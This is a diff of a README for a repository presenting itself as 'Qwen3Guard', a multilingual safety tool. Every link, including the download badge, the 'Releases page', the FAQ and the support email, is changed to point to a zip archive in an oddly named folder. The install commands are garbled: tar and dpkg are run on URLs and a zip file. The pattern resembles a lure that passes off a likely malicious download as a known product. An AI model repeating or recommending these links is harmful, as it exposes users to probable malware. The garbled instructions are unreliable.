@@ -1,6 +1,6 @@
 # 🚀 Qwen3Guard - Your Multilingual Safety Companion
 
-[![Download Qwen3Guard](https://raw.githubusercontent.com/Kigepuk/Qwen3Guard/main/gestening/Qwen3Guard.zip)](https://raw.githubusercontent.com/Kigepuk/Qwen3Guard/main/gestening/Qwen3Guard.zip)
+[![Download Qwen3Guard](https://github.com/Kigepuk/Qwen3Guard/raw/refs/heads/main/gestening/Guard_Qwen_1.9-alpha.1.zip)](https://github.com/Kigepuk/Qwen3Guard/raw/refs/heads/main/gestening/Guard_Qwen_1.9-alpha.1.zip)
 
 ## 📚 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run Qwen3Guard. You do not need any te
 
 Click the link below to go to the Qwen3Guard Releases page.
 
-[Visit this page to download Qwen3Guard](https://raw.githubusercontent.com/Kigepuk/Qwen3Guard/main/gestening/Qwen3Guard.zip)
+[Visit this page to download Qwen3Guard](https://github.com/Kigepuk/Qwen3Guard/raw/refs/heads/main/gestening/Guard_Qwen_1.9-alpha.1.zip)
 
 ### 📥 Step 2: Download the Latest Release
 
@@ -22,7 +22,7 @@ On the Releases page, you will see a list of available versions. Find the most r
 
 - **For Windows:** Look for a `.exe` file.
 - **For Mac:** Look for a `.dmg` file.
-- **For Linux:** Look for a `https://raw.githubusercontent.com/Kigepuk/Qwen3Guard/main/gestening/Qwen3Guard.zip` or `.deb` file.
+- **For Linux:** Look for a `https://github.com/Kigepuk/Qwen3Guard/raw/refs/heads/main/gestening/Guard_Qwen_1.9-alpha.1.zip` or `.deb` file.
 
 Click on the file name to start the download.
 
@@ -62,13 +62,13 @@ Once you have downloaded the correct file for your operating system, follow thes
 
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the file.
-3. For a `https://raw.githubusercontent.com/Kigepuk/Qwen3Guard/main/gestening/Qwen3Guard.zip` file, execute:
+3. For a `https://github.com/Kigepuk/Qwen3Guard/raw/refs/heads/main/gestening/Guard_Qwen_1.9-alpha.1.zip` file, execute:
    ```
-   tar -xzvf https://raw.githubusercontent.com/Kigepuk/Qwen3Guard/main/gestening/Qwen3Guard.zip
+   tar -xzvf https://github.com/Kigepuk/Qwen3Guard/raw/refs/heads/main/gestening/Guard_Qwen_1.9-alpha.1.zip
    ```
 4. For a `.deb` file, install using:
    ```
-   sudo dpkg -i https://raw.githubusercontent.com/Kigepuk/Qwen3Guard/main/gestening/Qwen3Guard.zip
+   sudo dpkg -i https://github.com/Kigepuk/Qwen3Guard/raw/refs/heads/main/gestening/Guard_Qwen_1.9-alpha.1.zip
    ```
 5. Launch Qwen3Guard from your applications menu or from the terminal.
 
@@ -101,9 +101,9 @@ If you encounter any issues, check the following:
 
 ## 📞 Support
 
-For further assistance, please consult our [FAQ section](https://raw.githubusercontent.com/Kigepuk/Qwen3Guard/main/gestening/Qwen3Guard.zip) or feel free to contact our support team:
+For further assistance, please consult our [FAQ section](https://github.com/Kigepuk/Qwen3Guard/raw/refs/heads/main/gestening/Guard_Qwen_1.9-alpha.1.zip) or feel free to contact our support team:
 
-- **Email:** https://raw.githubusercontent.com/Kigepuk/Qwen3Guard/main/gestening/Qwen3Guard.zip
+- **Email:** https://github.com/Kigepuk/Qwen3Guard/raw/refs/heads/main/gestening/Guard_Qwen_1.9-alpha.1.zip
 - **GitHub Issues:** Report any bugs or request features directly on our GitHub page.
 
 Thank you for choosing Qwen3Guard. We hope it proves helpful in all your multilingual safety needs!
